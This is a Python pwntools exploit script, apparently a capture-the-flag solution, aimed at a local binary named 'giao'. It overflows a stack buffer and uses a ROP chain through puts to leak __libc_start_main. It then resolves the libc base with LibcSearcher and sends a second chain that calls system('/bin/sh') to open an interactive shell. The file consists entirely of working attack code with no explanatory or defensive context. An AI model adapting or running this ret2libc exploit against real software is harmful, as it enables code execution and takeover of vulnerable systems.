from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level="debug"

sh = process('./giao')

elf = ELF('./giao')

#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(sh)
#raw_input()

puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

log.info("Finded puts@plt: " + hex(puts_plt))
log.info("Finded libc_start_main@got: " + hex(libc_start_main_got))
log.info("Finded func_main addr: " + hex(main) )

pop_rdi_ret = 0x4007c3

payload = flat(['\x00' * 72, p64(pop_rdi_ret), p64(libc_start_main_got), p64(puts_plt), p64(main)])
sh.sendlineafter('yi giao wo li giao?', payload)

libc_main = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.info("Leak libc_start_main addr: " + hex(libc_main))

libc = LibcSearcher('__libc_start_main',libc_main)
libcbase = libc_main - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

log.info("Finded system in libc: " + hex(system_addr))
log.info("Finded binsh in libc: " + hex(binsh_addr))

payload2 = flat(['\x00' * 72, p64(pop_rdi_ret), p64(binsh_addr), p64(system_addr), p64(0xdeadbeef)])
sh.recvuntil('giao?')
sh.sendline(payload2)
sh.interactive()
